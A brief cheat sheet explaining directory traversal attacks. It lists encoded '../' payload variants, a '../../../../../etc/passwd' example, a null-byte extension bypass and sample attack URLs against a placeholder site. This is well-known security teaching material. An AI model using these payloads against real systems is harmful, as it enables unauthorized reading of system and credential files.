Directory traversal, dot dot slash attack.

Dot dot slash attacks allow you to break out of a directory into the wider filesystem.

Maybe they're expecting you to specify the name of a file in the directory, like "favoritebooks.txt"
but instead you give the dialog "../../../../../etc/passwd"

Variations:
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../ 
%2e%2e%5c represents ..\
%2e%2e\ represents ..\ 
..%5c represents ..\ 
%252e%252e%255c represents ..\ 
..%255c represents ..\
..%c0%af represents ../ 
..%c1%9c represents ..\

?file=secret.doc%00.pdf
Null bytes terminate strings, so if an app expects to see pdf input, and you want to upload your doc, inserting the null byte might be what you need.

Say a site uses this format to get files you've stored
http://some_site.com.br/get-files.jsp?file=report.pdf
http://some_site.com.br/get-page.php?home=aaa.html 
http://some_site.com.br/some-page.asp?page=index.html

http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file
can allow you to break out and get other files.
